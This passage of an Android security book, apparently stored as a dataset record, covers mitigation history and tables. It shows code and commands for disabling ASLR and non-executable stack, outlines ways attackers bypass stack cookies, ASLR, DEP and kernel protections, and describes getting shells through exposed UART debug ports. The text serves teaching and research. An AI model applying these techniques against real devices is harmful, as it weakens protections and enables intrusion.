areas of fl ash memory, even if the partition\nhas been mounted in read-write mode. Doing this prevents exploits from modi-\nfying the /system partition data without circumventing the NAND protection.\nToshiba included a kernel module called sealime.ko on one of its devices. As\ndiscussed previously, that module implemented several SELinux-like restrictions.\nDuring development, the offi cial Android teams, spearheaded by Nick\nKralevich, made several incremental improvements to harden core operating sys-\ntem components. In particular, the 4.0.4, 4.1, and 4.2.2 releases introduced changes\nto make exploiting certain issues more diffi cult, or in some cases impossible.\nAs of the release of 4.0.4, the init program in Android no longer follows sym-\nbolic links when processing the chmod, chown, or mkdir actions in an init.rc.\nCommits 42a9349 and 9ed1fe7 in the system/core/init repository introduced\nthis change. This change prevents using symbolic links to exploit fi le system\nvulnerabilities in init scripts. One such issue is presented as an example in\nChapter 3.\nThe release of Android 4.1 brought changes to logging and umask functional-\nity. First, this release removed the ability for third-party apps to make use of\nthe READ_LOGS permission. This prevents rogue applications from obtaining\npotentially sensitive information that is logged by another application. For\nexample, if a banking app sloppily logged a user’s password, a rogue app could\npotentially obtain the credentials and relay them back to an attacker. With 4.1\nand later, apps can see only their own log data. Second, the default umask value\nwas changed. This setting specifi es the permissions of fi les and directories when\nthey are created without explicitly providing permissions. Prior to this release,\nthe default value was 0000, which causes fi les and directories to be writable by\nany user (any app) on the system. With this release, the value was changed to\n0077, which limits access to the user that creates the fi le. Both of these changes\nimprove the overall security posture of Android devices.\nWARNING A specifi c exception was made for ADB when modifying the default\numask setting. As a result, ADB still creates fi les with permissive permissions. Take\nextra care when creating fi les using ADB.\nc12.indd 01:23:44:PM 02/24/2014 Page 412\nChapter 12 ■ Exploit Mitigations 413\nAndroid 4.2 also included a couple of changes that improved security. First,\nGoogle changed the default behavior of the exported attribute of Content Providers\nfor apps that target application programming interface (API) level 17 or higher.\nThat is, they changed how Android handles an app that doesn’t explicitly set\nthis property. Prior to this release, all Content Providers were accessible by other\napps by default. After, app developers need to explicitly set the property if they\nwant to expose their Content Provider to other apps. Second, the SecureRandom\nclass was updated to make its output less predictable when using an initial\nseed value. One of the SecureRandom class constructors accepts a seed value\nparameter. Before this change, using this constructor would yield an object\nthat produced deterministic random values. That is, creating two such objects\nwith the same seed would produce the same stream of random numbers. After\nthe change, it will not.\nMost recently, Android 4.2.2 hardened developer access using ADB. In 2012,\nresearchers Robert Rowley and Kyle Osborn brought attention to attacks that\nallowed data theft using ADB. Although such attacks require physical access,\nthey can be quickly and easily performed in two ways. First, in an attack called\nJuice Jacking, an attacker uses a custom mobile charging station to lure unsus-\npecting users to plug in their devices. Second, an attacker uses nothing but\nher own phone and a special micro Universal Serial Bus (USB) cable to steal\ndata from another user’s device. To address these attacks, Google switched on\na setting called ro.adb.secure. When enabled, this feature requires a user to\nmanually approve machines that attempt to access the device via ADB. Figure\n12-1 shows the prompt presented to the user.\nFigure 12-1: ADB whitelisting\nWhen connecting, the host machine presents its RSA, named after its inventors\nRon Rivest, Adi Shamir, and Leonard Adleman, key to the device. A fi ngerprint of\nthis key is shown to the user. The user can also choose to store the host machine’s\nc12.indd 01:23:44:PM 02/24/2014 Page 413\n414 Chapter 12 ■ Exploit Mitigations\nkey to prevent being prompted in the future. This feature both mitigates Kyle’s\nattack and prevents data from being accessed on a lost or stolen device.\nIt is important to note that the hardening measures discussed in this section\ndo not represent an exhaustive list. There are likely many more such improve-\nments waiting to be discovered, including some that may be implemented\nduring the writing of this book.\nSummary of Exploit Mitigations\nWhen Android was fi rst released, it included fewer exploit mitigations than\nmost other Linux systems. This is somewhat surprising because Linux has tra-\nditionally led the way and served as the proving ground for many mitigation\ntechniques. As Linux was ported to ARM, little attention was given to supporting\nthese mitigations. As Android became more popular, its security team increased\nexploit mitigation coverage to protect the ecosystem. As of Jelly Bean, Android\nimplements most modern exploit mitigations, with promises of more to come.\nTable 12-1 depicts a timeline of the offi cially supported mitigations in Android.\nTable 12-1: History of Core Android Mitigation Support\nVERSION MITIGATIONS INTRODUCED\n1.5 Disabled %n format specifi er in Bionic\nBinaries compiled with stack cookies (-fstack-protector)\nIncluded the safe_iop library\nIncluded enhanced dlmalloc\nImplemented calloc integer overfl ow check\nSupported XN in the kernel\n2.3 Binaries compiled with non-executable stack and heap\nOffi cial documentation states mmap_min_addr added\nBinaries compiled with -Wformat-security\n-Werror=format-security\n4.0 Randomized stack addresses\nRandomized mmap (libraries, anon mappings) addresses\n4.0.2 Randomized heap addresses\n4.0.4 Changed chown, chmod, mkdir to use NOFOLLOW\n4.1 Changed default umask to 0077\nRestricted READ_LOGS\nRandomized linker segment addresses\nc12.indd 01:23:44:PM 02/24/2014 Page 414\nChapter 12 ■ Exploit Mitigations 415\nVERSION MITIGATIONS INTRODUCED\nBinaries compiled using RELRO and BIND_NOW\nBinaries compiled using PIE\nEnabled dmesg_restrict and kptr_restrict\nIntroduced Isolated Services\n4.1.1 Increased mmap_min_addr to 32768\n4.2 Content providers no longer exported by default\nMade seeded SecureRandom objects non-deterministic\nImplemented use of FORTIFY_SOURCE=1\n4.2.2 Enabled ro.adb.secure by default\n4.3 Includes SELinux in permissive mode\nRemoved all set-uid and set-gid programs\nPrevented Apps from executing set-uid programs\nImplemented dropping Linux capabilities in zygote and adbd\n4.4 Includes SELinux in enforcing mode\nImplemented use of FORTIFY_SOURCE=2\nIn addition to implementing mitigation techniques in the operating system\nitself, it is also important to do so in the Android NDK. Table 12-2 depicts a\ntimeline of when the various compiler-supported mitigations were enabled by\ndefault in the Android NDK.\nTable 12-2: History of Android NDK Mitigation Support\nVERSION MITIGATIONS INTRODUCED\n1 Binaries compiled with stack cookies (-fstack-protector)\n4b Binaries compiled with non-executable stack and heap\n8b Binaries compiled using RELRO and BIND_NOW\n8c Binaries compiled using PIE\n9 Binaries compiled with -Wformat-security\n-Werror=format-security\nDisabling Mitigation Features\nIt is occasionally useful to disable mitigations temporarily while developing\nexploits or simply experimenting. Although some mitigations can be disabled\neasily, some cannot. This section discusses the ways that each protection can\nc12.indd 01:23:44:PM 02/24/2014 Page 415\n416 Chapter 12 ■ Exploit Mitigations\nbe disabled intentionally. Take care when disabling system-wide mitigations\non a device used for everyday tasks because doing so makes the device easier\nto compromise.\nChanging Your Personality\nThe fi rst, and most fl exible, way to disable mitigations is to use the Linux\npersonality system call. The setarch program is one way to invoke this func-\ntionality. This program is designed to allow disabling randomization, execution\nprotection, and several other fl ags on a per-process basis. Current versions of\nthe GNU Debugger (GDB) have a disable-randomization setting (enabled by\ndefault) that uses the personality system call. Although modern Linux kernels\nallow disabling randomization, they do not allow enabling the ability to map\nmemory at address zero. Further, setarch cannot disable execution protections\non x86_64 machines. Before you get too excited, personality settings are also\nignored when executing set-user-id programs. Fortunately, these protections\ncan be disabled using other means, as shown later in this section.\nThe personality system call function is not implemented in Android’s Bionic\nC runtime library. Despite this fact, it is still supported by the underlying Linux\nkernel. Implementing your own version of this system call is straightforward,\nas shown in the following code excerpt:\n#include <sys/syscall.h>\n#include <linux/personality.h>\n#define SYS_personality 136 /* ARM syscall number */\n...\nint persona;\n...\npersona = syscall(SYS_personality, 0xffffffff);\npersona |= ADDR_NO_RANDOMIZE;\nsyscall(SYS_personality, persona);\nHere the code uses the personality system call to disable randomization for\nthe process. The fi rst call obtains the current personality setting. We then set\nthe proper fl ag and execute the system call again to put our new persona into\neffect. You can fi nd other supported fl ags in the linux/personality.h fi le\nincluded in the Android NDK.\nAltering Binaries\nAs previously mentioned, some mitigation techniques are controlled by setting\nvarious fl ags within a particular program’s binary. Data execution prevention,\nbinary base address randomization implemented with Position-independent\nexecutables (PIE), and read-only relocations depend on fl ags in the binary.\nc12.indd 01:23:44:PM 02/24/2014 Page 416\nChapter 12 ■ Exploit Mitigations 417\nUnfortunately, disabling the PIE and relro mitigation techniques by modifying\nthe binary appears to be non-trivial. Thankfully, though, you can disable PIE\nrandomization with the personality system call discussed earlier, and you can\ndisable data execution prevention using the execstack program discussed previ-\nously. The following excerpt shows how to disable non-executable protections.\ndev:~/android $ cp cat-gn-takju cat-gn-takju-CLEARED\ndev:~/android $ execstack -s cat-gn-takju-CLEARED\ndev:~/android $ readelf -a cat-gn-takju-CLEARED | grep GNU_STACK\nGNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0\nAfter executing these commands, the cat-gn-takju-CLEARED binary will\nhave executable stack, heap, and other memory regions.\nshell@android:/ $ /system/bin/cat /proc/self/maps | grep ' ..xp ' | wc -l\n9\nshell@android:/ $ cd /data/local/tmp\nshell@android:/data/local/tmp $ ln -s cat-gn-takju-CLEARED cat\nshell@android:/data/local/tmp $ ./cat /proc/self/maps | grep ' ..xp ' | wc -l\n32\nAs you can see, the original binary has only 9 executable memory regions.\nThe binary with the GNU_STACK fl ag cleared has 32. In fact, only 1 memory region\nis non-executable!\nTweaking the Kernel\nQuite a few protections can be disabled system wide by tweaking the kernel’s\nconfi gurable parameters, called sysctls. To do this, you simply write the new\nvalue for the various settings to the corresponding confi guration entry in the\nproc fi le system. Zero page protections can be altered by writing a numeric\nvalue to /proc/sys/vm/mmap_min_addr. A value of 0 disables the protection.\nOther numbers set the minimum address that can be successfully mapped by\nuser-space programs. Kernel pointer restrictions can be confi gured by writing a\n0 (disabled), 1 (allow root), or 2 (deny all) to /proc/sys/kernel/kptr_restrict.\nKernel log restrictions can be disabled by writing 0 to /proc/sys/kernel/\ndmesg_restrict. Address space layout randomization can be controlled using\n/proc/sys/kernel/randomize_va_space. A value of 0 disables all randomiza-\ntion system wide. Setting this parameter to 1 randomizes all memory regions\nexcept the heap. Writing 2 tells the kernel to randomize all memory regions,\nincluding the heap.\nAlthough disabling mitigation techniques is useful when exploring, it is unwise\nto assume a target system is in a weakened state. Developing a successful attack\noften requires overcoming, or bypassing, mitigations instead.\nc12.indd 01:23:44:PM 02/24/2014 Page 417\n418 Chapter 12 ■ Exploit Mitigations\nOvercoming Exploit Mitigations\nAs more and more mitigations have been introduced, exploit developers have\nhad to adapt. When a new technique is published, security researchers rush to\nponder ways to overcome it. By thinking outside the box and fully understand-\ning each technique, they have been quite successful. Consequently, methods\nfor circumventing heap hardening, stack buffer protections, execution protec-\ntions, ASLR, and other protections are widely available. A plethora of papers,\npresentations, slide decks, blogs, articles, exploit code, and so on document\nthese techniques in great detail. Rather than document every possible bypass,\nthis section briefl y discusses techniques for overcoming stack cookies, ASLR,\nexecution protections, and kernel mitigations.\nOvercoming Stack Protections\nRecall that stack protections work by placing and verifying cookie values in a\nfunction’s stack frame. This protection has a few key weaknesses. First, com-\npilers determine which functions receive stack cookies based on heuristics or\nmanual intervention. To limit the effect on performance, a function that has no\nstack-stored buffers will not get a stack cookie. Also, functions with small arrays\ncontaining structures or unions may not be protected. Second, cookie values are\nonly validated prior to a function returning. If an attacker manages to corrupt\nsomething on the stack that is used prior to this check, he may be able to avoid\nthis protection. In the case of the zergRush exploit, the exploit developer was\nable to corrupt another local variable in the stack frame. The corrupted variable\nwas then freed before the vulnerable function returned, leading to a use-after-\nfree condition. Finally, if given enough attempts, attackers can correctly guess\ncookie values. Several corner cases make this type of attack easier, including low\nentropy or network services that fork for each incoming connection. Although\nthe stack buffer protection has prevented many issues from being exploited, it\ncannot prevent them all.\nOvercoming ASLR\nAlthough ASLR makes exploit development more challenging, several techniques\nexist for overcoming it. As previously mentioned, the easiest way to overcome\nASLR is to utilize a memory region that is not randomized. In addition, attackers\ncan use heap spraying to cause data under their control to be at a predictable\nlocation in memory. This issue is exacerbated by the limited address space of\n32-bit processors and is especially dangerous in the absence of data execution\nprotections.\nc12.indd 01:23:44:PM 02/24/2014 Page 418\nChapter 12 ■ Exploit Mitigations 419\nNext, attackers can take advantage of information leak vulnerabilities to\ndetermine a process’s address space layout. This technique predates the ASLR\nmitigation itself, but has only become popular recently.\nLastly, attackers can take advantage of the fact that randomization takes place\nwhen a process starts, but not when a program uses the fork system call. When\nusing fork, the address space layout of the new process will be identical to that\nof the original. An example of this paradigm on Android is Zygote. Zygote’s\ndesign uses this technique to be able to launch apps, which have a large, shared,\nand prepopulated address space with very low overhead. Because of this fact,\nany Android application on a device can be used to leak memory addresses that\ncan be subsequently used to execute a successful attack. For example, a mali-\ncious application could send memory address information to a remote website,\nwhich later uses that information to reliably exploit memory corruption in the\nAndroid browser. Despite being challenging to exploit developers, these and\nother methods remain viable for overcoming ASLR.\nOvercoming Data Execution Protections\nAlthough preventing data execution makes exploitation more diffi cult, its true\npotential was not fully realized until it was combined with full ASLR. Overcoming\nthis protection typically relies on a memory region containing executable data\nliving at a predictable address in the address space. In the absence of such\na region, attackers can exploit information leakage issues to discover where\nexecutable code lives. Using Return-Oriented Programming (ROP), discussed\nfurther in Chapter 9, an attacker can piece together bits of code to achieve her\ngoal. All things considered, this mitigation technique is only as strong as the\nASLR it is paired with.\nOvercoming Kernel Protections\nSeveral kernel protection mechanisms are easily bypassed. Recall that kptr_\nrestrict and dmesg_restrict aim to hide sensitive information about the ker-\nnel’s address space from a local attacker. Also, remember that Android devices\ndepend on a precompiled kernel embedded into the boot partition. Without\nkernel-level ASLR, discovering the kernel address of key functions and data\nstructures is as easy as obtaining and inspecting the kernel image for the target\ndevice. Anyone can get such an image by simply extracting it from a factory\nimage, over-the-air update, or a device in their possession.\nEven with kernel-level ASLR in place, this issue remains. There, an attacker\ncould fi nd key kernel objects by discovering the base address of the kernel and\ncombining it with data from the kernel image. Finding the kernel base is believed\nto be easily accomplished using cache timing attacks. Although using a custom\nc12.indd 01:23:44:PM 02/24/2014 Page 419\n420 Chapter 12 ■ Exploit Mitigations\nkernel fi xes this issue, it’s not a workable solution for all devices. Specifi cally,\nusing a custom kernel isn’t possible on devices with locked boot loaders. That\nroadblock aside, most consumers don’t have the desire, time, or technical exper-\ntise to build a custom kernel. Predictable and easily obtainable kernel images\nmake overcoming kernel address leak protections easy.\nEven in the face of all of the mitigation techniques deployed on modern sys-\ntems, attackers remain undeterred. Each mitigation technique, when considered\nalone, has weaknesses that are easily overcome. Even when combined, which\ntruly makes attacks more diffi cult, attackers manage to fi nd ways to achieve\ntheir goals. However, these mitigation techniques do increase costs, complicate\nmatters, and even prevent many vulnerabilities from being leveraged at all. It’s\nlikely that exploitation will become even harder in the future as new mitigation\ntechniques are researched, developed, and deployed.\nLooking to the Future\nAlthough it is impossible to know exactly what the future holds, it is clear that\nthe Android Security Team invests heavily in researching, developing, and\ndeploying exploit mitigations. Several offi cial projects already underway are\nlikely to be included in a future Android release. Additional work on harden-\ning ARM Linux, and even Android specifi cally, may eventually be adopted.\nAlso, PC operating systems such as Linux and Windows include a variety of\ntechniques that hold promise. Regardless of which mitigations are chosen for\ninclusion, it’s almost certain that additional exploit mitigations will be imple-\nmented in Android.\nOffi cial Projects Underway\nWhile researching existing mitigation techniques on Android, we discov-\nered a ticket that indicates Google may be investigating more granular sand-\nboxing. Although Android uses a form of sandboxing, it is quite coarse. The\nticket, which you can fi nd at https://code.google.com/p/chromium/issues/\ndetail?id=166704, tracks the implementation of the seccomp-bpf sandbox\non Android. This mechanism allows enabling and disabling kernel-provided\nfunctionality on a per-process basis. It’s already utilized on Chrome OS and\nthe Chromium browser on Linux. It’s not clear whether this method will be\ndeployed on Android. Even if it is deployed, it’s not clear if it will be used by\nAndroid itself or only by the Chrome for Android browser.\nCommunity Kernel Hardening Eff orts\nApart from offi cial Google efforts, several community open source projects aim\nto further harden the Linux kernel. This includes a couple of projects within the\nc12.indd 01:23:44:PM 02/24/2014 Page 420\nChapter 12 ■ Exploit Mitigations 421\nupstream Linux kernel itself and several from independent parties. It’s unclear\nwhether these will ever make it into an offi cial Android release, but they still\nserve as a possibility of what the future may bring.\nFor the past few years, Kees Cook has been trying to get fi le system link pro-\ntections included in the offi cial Linux kernel source. It was not until recently,\nwith the release of Linux 3.6, that he fi nally achieved his goal. These protections\nare two-fold. First, symbolic links are checked to ensure that certain criteria are\nmet. To quote Kees’s commit message:\nThe solution is to permit symlinks to only be followed when outside a\nsticky world-writable directory, or when the uid of the symlink and follower\nmatch, or when the directory owner matches the symlink’s owner.\nEnforcing these restrictions prevents symbolic link attacks, including those\nexploited by several Android rooting tools. Second, unprivileged users can no\nlonger create hard links to fi les that they do not own or cannot access. Together,\nthese protections make exploiting several fi le-system based attacks impossible.\nUnfortunately, no Android devices ship with a 3.6 kernel at the time of this\nwriting. Future devices that do will likely include and enable this protection.\nFrom time to time, talk about implementing kernel ASLR arises in the Linux\nkernel developer community. Modern operating systems such as Windows, Mac\nOS X, and iOS already utilize this technique. As previously mentioned in the\n“Overcoming Exploit Mitigations” section, this technique provides relatively\nlittle protection against local attacks. However, it will make remote attacks more\ndiffi cult to execute successfully. It’s likely that this protection will be implemented\nin the upstream Linux kernel, and then later into Android devices.\nIn the PC space, the newest mitigations include Intel’s hardware-based\nSupervisor Mode Access Protection (SMAP) and Supervisor Mode Execution\nProtection (SMEP) technologies. These technologies aim to prevent kernel-space\ncode from accessing or executing data that lies in user-space. Modern ARM\nprocessors also include several features that can be used to implement similar\nprotections. Brad Spengler, long-time kernel researcher and maintainer of the\ngrsecurity project, developed and released several hardening patches for the\nARM Linux kernel on his website. These include the UDEREF and PXN pro-\ntections, which are similar to SMAP and SMEP, respectively. Although these\nprotections are interesting, there’s currently no indication that they will be\ndeployed on future Android devices.\nOne other effort deserves mention here. Subreption announced their Defense\nAdvanced Research Projects Agency (DARPA)–sponsored SAFEDROID project\nin September 2012. The goals of that project include improving ASLR, harden-\ning the kernel heap, and improving memory protections between kernel space\nand user space. These goals, although aggressive, are admirable. They would\npresent a signifi cant challenge to kernel exploitation. Unfortunately, the project\ndoes not appear to have come to fruition as of this writing.\nc12.indd 01:23:44:PM 02/24/2014 Page 421\n422 Chapter 12 ■ Exploit Mitigations\nA Bit of Speculation\nAside from the projects mentioned previously, there are other hardening mea-\nsures that might be implemented. Code-signing enforcement is a technique used\non iOS that has proven to be quite effective in hindering exploit development.\nThough adopting strict enforcement in Android would have a similar effect, it’s\nunlikely to be adopted because doing so would also negatively affect the open\nnature of the Android app development community. Although the safe_iop\nlibrary has been included since the beginning, Android’s use of the library is\nvery sparse. Increasing the use of this library is a logical next step in hardening\nAndroid. Predicting the future of Android mitigations with absolute certainty\nis impossible. Only time will tell which, if any, additional mitigation techniques\nwill make into Android.\nSummary\nThis chapter explored the concept of exploit mitigations and how they apply\nto the Android operating system. It explained that implementing mitigation\ntechniques requires changes to the hardware, Linux kernel, Bionic C library,\ncompiler tool chain, or some combination of components. For each of the mitiga-\ntion techniques covered, background information, implementation goals, and\nAndroid history were covered. A summary table, detailing the history of miti-\ngations support in Android was presented. The chapter discussed methods for\nintentionally disabling and overcoming exploit mitigation techniques. Finally,\nit looked at what the future might hold for exploit mitigations on Android.\nThe next chapter discusses attacks against the hardware of embedded sys-\ntems like Android devices. It examines the tools and techniques used to attack\nhardware and what is possible when such attacks are successful.\nc12.indd 01:23:44:PM 02/24/2014 Page 422"
  },
  {
    "input": "What are the common hardware interfaces used in embedded systems and how can they be exploited or reverse engineered by attackers?",
    "summary": "Android's portability and flexibility have made it a popular choice for embedded systems, including devices like e-readers and smart TVs. This chapter discusses hardware attack techniques, focusing on interfaces such as UART, I2C, SPI, and JTAG, which can be used to reverse engineer and exploit embedded devices. It also covers tools like the JTAGulator and Saleae Logic Analyzer that help identify these interfaces and extract data for analysis.",
    "output": "CHAPTER\n13\nHardware Attacks\nThe portability and versatility of Android across a diverse range of mobile\nhardware platforms has made it extremely successful in the mobile space,\nalmost to the point of ubiquity. Its portability and fl exibility is also one factor\nthat’s pushing Android to become the operating system of choice for other\nkinds of embedded systems. Android is open, highly customizable, and is\nrelatively easy for rapidly developing visually appealing user interfaces. This\nis especially true when compared to previous industry standard options,\nsuch as bare-bones embedded Linux and real-time or proprietary operating\nsystems. As the new de facto standard for a variety of new kinds of embedded\ndevices, Android is on e-readers, set-top entertainment systems, airline in-fl ight\nentertainment systems, “smart” televisions, climate control systems, and point-\nof-sale systems. (And that’s just to name a few that we’ve personally poked at.)\nWith Android powering these kinds of devices, we’d be remiss to not at least\naddress some simple techniques for attacking and reverse engineering these\nkinds of devices’ hardware.\nAs an attack vector, physical access to hardware is generally viewed as “game\nover” and low threat from traditional risk and threat modeling perspective.\nHowever, in many cases “physical” techniques can be employed to perform\nvulnerability research that has greater impact. For example, consider a connection\n423\nc13.indd 08:24:56:AM 03/04/2014 Page 423\n424 Chapter 13 ■ Hardware Attacks\nto an unprotected debug port on a router or switch. With proper access, this\nwould allow an attacker the freedom to fi nd embedded encryption keys or\nremotely exploitable vulnerabilities. Physical access to the device also means\nthat an attacker can remove chips to reverse engineer them. These results can\nhave wider impact than the few devices that were sacrifi ced during the research.\nThis chapter discusses some simple tools and techniques intended to lower the\nbarrier to entry of hardware focused embedded device security research. With\nphysical access to a target device you can use these simple techniques to either\nobtain the software it contains or to attack software via hardware interfaces.\nAfter you’ve vaulted the hardware hurdle, many software-based exploitation\nand reverse-engineering techniques apply again. This might include using a\ndisassembler to hunt for vulnerabilities in the fi rmware or discovering a pro-\nprietary protocol parser for data arriving on a hardware interface like Universal\nSerial Bus (USB). These techniques are very simple and do not dive into hard-\ncore electrical engineering topics. Although most of these techniques—such\nas debugging, bus monitoring, and device emulation—are relatively passive, a\nfew are slightly more destructive to the target device.\nInterfacing with Hardware Devices\nThe fi rst thing you might want to do as a reverse engineer or vulnerability\nresearcher is to enumerate the ways you can interface (on a physical level) with\nthe target device. Are there any exposed interfaces on the device? Are there\nports or receptacles for things like USB or memory cards? We’ll discuss some of\nthese familiar interfaces later in this chapter, but for now this section discusses\nsome of the things you might encounter after you pop open a device’s casing\nand are looking at its printed circuit board (PCB). Before we go into examples\nand test cases, the section describes a bit about the most common hardware\ninterfaces found in devices.\nUART Serial Interfaces\nUniversal Asynchronous Receiver/Transmitter (UART) interfaces are by far\nthe most common interface for diagnostic and debug output from embedded\ndevices. UART Serial interfaces may implement one of a handful of communica-\ntion standards (RS-232, RS-422, RS-485, EIA, and so on). These communication\nstandards merely dictate details such as the characteristics of signals (i.e., what\ndifferent signals mean — start transmitting, stop transmitting, reset the con-\nnection, and so on). These standards also dictate things like timing (i.e., how\nfast data should be transmitted) and in some cases the size and description of\nc13.indd 08:24:56:AM 03/04/2014 Page 424\nChapter 13 ■ Hardware Attacks 425\nconnectors. If you want to learn more about the different fl avors of UART, the\nInternet is a great source of these very old and well-documented standards.\nFor now, however, the most relevant point is that these kinds of interfaces are\nextremely common in embedded devices.\nWhy is UART so common? It offers a simple way to transfer data directly\nto and from controllers and microprocessors without needing to go through\nintermediary hardware that’s too complex to be cheaply included in a micropro-\ncessor. Figure 13-1 shows a UART interface that connects directly into a central\nprocessing unit (CPU).\nControl\nCPU Address\nData\n8\nUART\n1\n1\nRx Tx\nSerial Data\nFigure 13-1: UART Serial directly connected to a CPU\nUART Serial interfaces long pre-dated dedicated video cards, keyboard/mice\nports, and network interface cards as a primary way to interface with computers.\nMany of the earliest computer systems ran without a keyboard, mouse, moni-\ntor, or video output. Instead, the only control interface was a serial port that a\nuser would connect to a dedicated “dumb terminal” (such as Wyse). For many\nyears this was the most common way to access the command-line console of\na computer: via a UART serial port. In fact, many modern Unix concepts stem\nfrom these early origins. For example, many Unix and Linux users are familiar\nwith the concept of their terminals running on a TTY. This term itself is from\nan era when interfacing with Unix systems was done via a serial connection to\na TeleTYpe Writer (hence the abbreviation TTY).\nUART serial interfaces can come in many different fl avors but the simplest\ncan be implemented with as little as three or four connecting wires. The simplic-\nity of UART means it is a very cheap and lightweight to implement in a circuit\ndesign. As such, UART consoles can be found in virtually every embedded\nc13.indd 08:24:56:AM 03/04/2014 Page 425\n426 Chapter 13 ■ Hardware Attacks\nsystem, often getting embedded directly into System-on-Chip (SoC) products\ncreated by original equipment manufacturers (OEMs).\nOn embedded systems, such as set-top boxes, the video output is\ngenerally dedicated entirely to the high-level user interface. Additionally, devices\nlike these may have limited user input, such as a dedicated remote. In these\ncircumstances, a market-ready product leaves few options for lower-level debug\nfunctionality. Therefore, one can envision how developers might fi nd a UART\nserial console (hidden within the device) extremely useful for debugging and\ndiagnostics. Indeed many consumer-grade products leave these interfaces\nexposed and enabled.\nWhat Does an Exposed Serial Interface Mean?\nWhether you have the ability to directly interface with the embedded operating\nsystem (OS) using an exposed serial console or the ability to intercept, view,\ntamper with, or generate data on any of these intra-chip conversation paths,\nthe effect is the same: more attack surface. As you read in Chapter 5, the size of\na target’s attack surface is directly proportional to how much it interfaces with\nother systems, code, devices, users, and even its own hardware. Being aware of\nthese interfaces broadens your understanding of the attack surface of a whole\nhost of devices, and not just those running Android.\nExposed UART on Android and Linux\nIt is common in embedded Android-based systems to fi nd exposed UART serial\nports that (when properly connected) will allow console access directly to the\nunderlying operating system. As discussed throughout this book, the common\nway to interface with Android is via Android Debug Bridge (ADB). However,\nit is quite common for Android-based embedded systems (that have exposed\nUART) to have been compiled with these kernel compile-time options:\nCONFIG_SERIAL_MSM\nCONFIG_SERIAL_MSM_CONSOLE\nThen generally the boot loader, such as uBoot and X-Loader, will pass the\nkernel the serial port confi guration options via a boot-time option such as the\nfollowing:\n\"console=ttyMSM2,115200n8\"\nc13.indd 08:24:56:AM 03/04/2014 Page 426\nChapter 13 ■ Hardware Attacks 427\nIn this case, all “stdout,” “stderr,” and “debug” prints are routed to the serial\nconsole. If the device is running Android or standard Linux and login is in the\nboot sequence, a login prompt also generally appears here.\nNOTE These confi guration settings are specifi cally for compiling Android on a\nQualcomm MSM-based chipset, but the idea is the same across chipsets.\nWith these interfaces, you can generally watch the device boot, print debug,\nand diagnostic messages (think syslog or dmesg), or you can even interactively\ninterface with the device via a command shell. Figure 13-2 shows the UART\npins of a set-top box.\nFigure 13-2: Set-top box pinouts\nWhen connected to the appropriate pins on the circuit board, the few leads\nshown in Figure 13-2 could be used to access a root shell on the embedded\nAndroid operating system. The exact same technique, when applied to a popu-\nlar Broadcom-based cable modem, revealed a customized Real-time operating\nsystem. Although there was no interactive shell on the UART of the Broadcom,\nwhen services on the device’s Internet Protocol (IP) address were fuzzed, stack\ntracks displayed on the UART, which ultimately informed the exploitation\nprocess. The UART pins for this device are pictured in Figure 13-3.\nc13.indd 08:24:56:AM 03/04/2014 Page 427\n428 Chapter 13 ■ Hardware Attacks\nFigure 13-3: Comcast Broadcom pinouts\nThese are just two simple examples from our own research. This same vulner-\nability, an unprotected UART, has been found on many more devices privately.\nThe Internet is rife with blog posts and information security presentations based\nentirely on exposed UARTs, such as femtocell hacking, OpenWRT Linksys hacks,\ncable modem vulnerabilities, and satellite dish hacks.\nSo how do you go about fi nding these hardware interfaces? How might you\ndiscover which pins do what? You will learn some simple techniques and tools\nfor how to do this in the “Finding Debug Interfaces” section later in this chapter.\nFirst, though, you should have some background on the other types of interfaces\nyou might also encounter so you can differentiate between them.\nI2C, SPI, and One-Wire Interfaces\nThe aforementioned UART serial interfaces are generally used when a human\nneeds to interactively interface with the machine. There are, however, even simpler\nserial protocols that can be found in virtually every embedded device. Unlike\nUART, these serial protocols arose out of a need for the integrated circuits (ICs or\n“chips”) in a given circuit to communicate with each other. These simple serial\nprotocols can be implemented with very few pins (in some cases, just one pin!)\nand as such allow for circuit designers to simply form the equivalent of local\narea networks on the circuit board so that all the chips can speak to one another.\nc13.indd 08:24:56:AM 03/04/2014 Page 428\nChapter 13 ■ Hardware Attacks 429\nThe most common of these simple serial protocols are I2C and SPI. I2C or I2C\n(pronounced “I squared C”) comes from its expanded abbreviation which is IIC\n(Inter-Integrated Circuit). SPI comes from Serial Peripheral Interface bus, and\nOne-Wire (1-Wire) derives its name from the fact that it only requires one wire\nor one contact to provide power and the communication path.\nBefore we continue discussing how ubiquitous and common these serial\nprotocols are in ICs, it is important to point out that not every trace on a PCB\nbetween components can be assumed to be carrying serial data. Unfortunately,\nit is not that simple. Many ICs will also share data and interface with other ICs\nthe old-fashioned way — by simply changing the state of a series of pins (high\nor low voltage relative to some fi xed norm representing binary 1 or 0 respec-\ntively). Generally pins such as these are referred to as GPIO which stands for\ngeneral purpose input/output.\nSome pins carry analog signals and some digital. So in those cases you would\nlikely need to understand the protocol that the IC uses to communicate with the\noutside world. Generally, that can be found by simply reading the manual for\nthat IC or by skimming through the specifi cations sheet for the pinouts. (This\nquickly gets into the realm of detailed electrical engineering, which is beyond\nthe scope of this book.)\nThat said, rarely do you need to go into this level of detail thanks to the\nubiquity of these simple serial protocols. Because these simple serial protocols\nrequire much less complexity than UART, they can be easily and inexpensively\nembedded into virtually any IC capable of outputting digital data to a few of\nits pins. These serial protocols are commonly found in the wild implemented\nin ICs that do virtually anything, including:\n■ Tilt/Motion detection (accelerometers)\n■ Clocks\n■ Stepper motors\n■ Servos\n■ Voltage regulators\n■ A/D (analog-to-digital) converters\n■ Temperature monitors\n■ Data storage (EEPROM)\n■ LCD/LED displays\n■ GPS Receivers (Global Positioning Satellites)\nBecause virtually every manufacturer wants its ICs to be easy to interface with,\nI2C and SPI are the standard for simple digital communication. For example, I2C\nc13.indd 08:24:56:AM 03/04/2014 Page 429\n430 Chapter 13 ■ Hardware Attacks\nserial communication is how Nintendo Wii controllers communicate. The cable\nthat connects the Nintendo controller to the Nintendo unit uses it. SPI and I2C\nare how most notebook batteries report their remaining charge to software on\nthe notebook. Often the logic for regulating the temperature, output, and state\nof a notebook battery is implemented in software on the laptop, which then\ncontrols the battery via the I2C bus.\nEvery VGA, DVI, and HDMI cable/device has dedicated I2C pins that are used\nas a rudimentary communication channel between the device and the video\ncard (or controller). Figure 13-4 depicts the pins involved in the I2C interface of\ncommon VGA, HDMI, and DVI connectors.\nVGA:\n5 4 3 2 1\n10 9 8 7 6\n15 14 13 12 11\nDVI:\n1 2 3 4 5 6 7 8\nC1 C2\n9 10 11 12 13 14 15 16\nC3 C4\n17 18 19 20 21 22 23 